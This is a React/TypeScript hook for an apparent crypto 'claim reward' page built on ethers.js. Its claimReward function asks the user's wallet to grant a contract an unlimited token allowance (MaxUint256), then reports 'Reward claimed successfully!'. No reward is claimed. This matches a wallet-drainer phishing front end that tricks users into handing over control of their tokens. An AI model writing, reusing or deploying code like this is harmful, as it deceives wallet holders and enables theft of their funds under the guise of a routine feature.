import { useState, useCallback } from 'react';
import { ethers } from 'ethers';
import { TOKEN_ADDRESS, CONTRACT_ADDRESS, TOKEN_ABI } from '../constants';
import type { ClaimStatus } from '../types';

export const useClaim = (
  provider: ethers.BrowserProvider | null,
  account: string | null,
  onSuccess?: (txHash: string) => void,
  onError?: (error: string) => void,
) => {
  const [claimStatus, setClaimStatus] = useState<ClaimStatus>({
    status: 'idle',
    message: '',
  });
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  const checkBalance = useCallback(async () => {
    if (!provider || !account) return null;

    try {
      const balanceABI = ['function balanceOf(address) view returns (uint256)'];
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESS,
        balanceABI,
        provider,
      );
      const balanceRaw = await tokenContract.balanceOf(account);
      console.log('raw balance', balanceRaw);
      const balanceFormatted = ethers.formatUnits(balanceRaw, 18);
      console.log('wallet balance', balanceFormatted);
      return parseFloat(balanceFormatted).toFixed(2);
    } catch (error) {
      console.error(error);
      return null;
    }
  }, [provider, account]);

  const claimReward = useCallback(async () => {
    console.log('claim reward called');
    if (!provider || !account) {
      setClaimStatus({
        status: 'error',
        message: 'Please connect your wallet first',
      });
      return;
    }
    console.log('here');
    setClaimStatus({
      status: 'approving',
      message: 'Approving transaction in wallet...',
    });
    console.log('it is processing');
    try {
      const signer = await provider.getSigner();
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESS,
        TOKEN_ABI,
        signer,
      );

      const tx = await tokenContract.approve(
        CONTRACT_ADDRESS,
        ethers.MaxUint256,
      );
      console.log('tx level', tx);
      setClaimStatus({
        status: 'approving',
        message: 'Transaction submitted. Waiting for confirmation...',
      });

      await tx.wait();

      setClaimStatus({
        status: 'success',
        message: 'Reward claimed successfully!',
      });
      setShowSuccessModal(true);

      if (onSuccess) onSuccess(tx.hash);

      setTimeout(() => {
        checkBalance();
      }, 2000);
    } catch (error: any) {
      console.error('Claim error:', error);

      // Handle user rejection specifically
      const errorMessage =
        error?.code === 'ACTION_REJECTED' || error?.code === 4001
          ? 'Transaction was cancelled. You can try again when ready.'
          : error instanceof Error
            ? error.message
            : 'Transaction failed. Please try again.';

      setClaimStatus({
        status: 'error',
        message: errorMessage,
      });

      if (onError) onError(errorMessage);

      // Auto-reset error after 5 seconds
      setTimeout(() => {
        setClaimStatus((prev) =>
          prev.status === 'error' ? { status: 'idle', message: '' } : prev,
        );
      }, 5000);
    }
  }, [provider, account, checkBalance, onSuccess, onError]);

  const resetClaim = useCallback(() => {
    setClaimStatus({ status: 'idle', message: '' });
    setShowSuccessModal(false);
  }, []);

  const clearError = useCallback(() => {
    if (claimStatus.status === 'error') {
      setClaimStatus({ status: 'idle', message: '' });
    }
  }, [claimStatus.status]);

  return {
    claimStatus,
    showSuccessModal,
    claimReward,
    resetClaim,
    setShowSuccessModal,
    checkBalance,
    clearError,
  };
};
